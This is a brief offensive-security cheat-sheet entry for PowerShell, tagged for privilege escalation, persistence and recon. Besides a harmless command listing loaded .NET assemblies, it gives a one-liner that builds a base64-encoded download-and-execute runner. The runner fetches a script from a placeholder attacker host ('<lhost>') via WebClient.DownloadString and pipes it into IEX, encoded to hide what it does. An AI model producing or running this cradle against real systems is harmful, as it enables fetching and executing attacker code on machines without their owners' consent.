# pwsh

#plateform/windows #target/local #cat/UTILS #tag/powershell 


## powershell view assemblies
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```


## powershell - generate base64 encoded payload download runner
#plateform/linux #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

```powershell
pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
```